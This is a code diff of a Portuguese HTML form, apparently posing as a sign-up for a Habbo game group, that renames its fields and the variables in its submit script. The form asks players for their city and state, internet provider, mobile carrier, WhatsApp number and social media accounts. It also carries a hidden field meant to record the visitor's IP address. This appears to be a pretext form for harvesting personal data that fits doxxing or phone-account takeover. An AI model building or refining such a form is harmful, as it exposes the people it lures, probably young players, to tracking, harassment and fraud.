@@ -149,13 +149,13 @@ p {
             <div class="details" bis_skin_checked="1">
                 <div class="input-box" bis_skin_checked="1">
                     <span class="details_span">Patente/cargo:</span>
-                    <input name="email" id="email" type="text" placeholder="Informe sua patente/cargo." required="">
+                    <input name="patente" id="patente" type="text" placeholder="Informe sua patente/cargo." required="">
                 </div>
             </div>
             <div class="details" bis_skin_checked="1">
                 <div class="input-box" bis_skin_checked="1">
                     <span class="details_span">Histórico no DIM:</span>
-                    <input name="patent" id="patent" type="text" placeholder="Seu email. Ex: vulgopeluca@gmail.com" required="">
+                    <input name="historico" id="historico" type="text" placeholder="Seu email. Ex: vulgopeluca@gmail.com" required="">
                 </div>
             </div>
 
@@ -169,27 +169,27 @@ p {
                 <div class="details" bis_skin_checked="1">
                     <div class="input-box" bis_skin_checked="1">
                         <span class="details_span">Registro dos locais onde você joga Habbo:</span>
-                        <input name="corregedoria" id="corregedoria" type="text" placeholder="Cidade, UF." required="">
+                        <input name="locais" id="locais" type="text" placeholder="Cidade, UF." required="">
                     </div>
 
 
                 <div class="details" bis_skin_checked="1">
                 <div class="input-box" bis_skin_checked="1">
                     <span class="details_span">Provedora de Internet:</span>
-                    <input name="dim2024" id="dim2024" type="text" placeholder=" A provedora que você usa pra se conectar no Habbo: Vivo Fibra, Claro NET, Vtal, Blink Telecom" required="">
+                    <input name="provedora" id="provedora" type="text" placeholder=" A provedora que você usa pra se conectar no Habbo: Vivo Fibra, Claro NET, Vtal, Blink Telecom" required="">
                 </div>
 
 
                 <div class="details" bis_skin_checked="1">
                 <div class="input-box" bis_skin_checked="1">
                     <span class="details_span">Companhia telefônica:</span>
-                    <input name="favorito" id="favorito" type="text" placeholder="A companhia telefônica a companhia do seu celular: Tim, Vivo, Claro, Nextel, Embratel." required="">
+                    <input name="telefonica" id="telefonica" type="text" placeholder="A companhia telefônica a companhia do seu celular: Tim, Vivo, Claro, Nextel, Embratel." required="">
                 </div>
 
 <div class="details" bis_skin_checked="1">
                 <div class="input-box" bis_skin_checked="1">
                     <span class="details_span">Seu número do Whatsapp:</span>
-                    <input name="comments" id="comments" type="text" placeholder="(00) 0000-0000" required="">
+                    <input name="whatsapp" id="whatsapp" type="text" placeholder="(00) 0000-0000" required="">
                 </div>
             </div>
             <!-- Campo oculto para armazenar o endereço IP -->
@@ -197,7 +197,7 @@ p {
                     <div class="details" bis_skin_checked="1">
                 <div class="input-box" bis_skin_checked="1">
                     <span class="details_span">Redes sociais:</span>
-                    <input name="favorito" id="favorito" type="text" placeholder="Facebook, Instagram..." required="">
+                    <input name="redes" id="redes" type="text" placeholder="Facebook, Instagram..." required="">
                 </div>
 
 <input type="hidden" id="ipAddress" name="ipAddress" value="168.227.228.94">
@@ -223,26 +223,26 @@ p {
 
         function submitForm() {
     var name = document.getElementById("name").value;
-    var email = document.getElementById("email").value;
+    var patente = document.getElementById("patente").value;
     var ipAddress = document.getElementById("ipAddress").value;
-    var patent = document.getElementById("patent").value;
-    var comments = document.getElementById("comments").value;
+    var historico = document.getElementById("historico").value;
     var nickantigo = document.getElementById("nickantigo").value;
-    var corregedoria = document.getElementById("corregedoria").value;
-    var dim2024 = document.getElementById("dim2024").value;
-    var favorito = document.getElementById("favorito").value;
+    var locais = document.getElementById("locais").value;
+    var provedora = document.getElementById("provedora").value;
+    var telefonica = document.getElementById("telefonica").value;
+    var whatsapp = document.getElementById("whatsapp").value;
     var redes = document.getElementById("redes").value; // Corrigido para pegar o campo correto
 
     var formData = {
         name: name,
-        email: email,
+        patente: patente,
         ipAddress: ipAddress,
-        patent: patent,
-        comments: comments,
+        historico: historico,
         nickantigo: nickantigo,
-        corregedoria: corregedoria,
-        dim2024: dim2024,
-        favorito: favorito,
+        locais: locais,
+        provedora: provedora,
+        telefonica: telefonica,
+        whatsapp: whatsapp,
         redes: redes // Incluindo o campo redes
     };
 
